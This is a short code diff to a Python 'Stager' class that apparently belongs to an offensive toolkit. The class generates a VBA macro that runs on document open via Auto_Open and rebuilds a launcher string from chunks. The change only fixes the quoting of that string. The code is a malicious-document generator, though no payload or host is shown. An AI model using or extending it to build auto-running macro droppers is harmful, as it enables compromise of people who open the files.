@@ -106,9 +106,9 @@ class Stager:
         else:
             chunks = list(helpers.chunks(launcher.replace("'", "\\'"), 50))
             payload = "\tDim "+Str+" As String\n"
-            payload += "\t"+Str+" = '" + str(chunks[0]) + "'\n"
+            payload += "\t"+Str+" = \"" + str(chunks[0]) + "\"\n"
             for chunk in chunks[1:]:
-                payload += "\t"+Str+" = "+Str+" + '" + str(chunk) + "'\n"
+                payload += "\t"+Str+" = "+Str+" + \"" + str(chunk) + "\"\n"
 
             macro = "Sub Auto_Open()\n"
             macro += "\t"+Method+"\n"
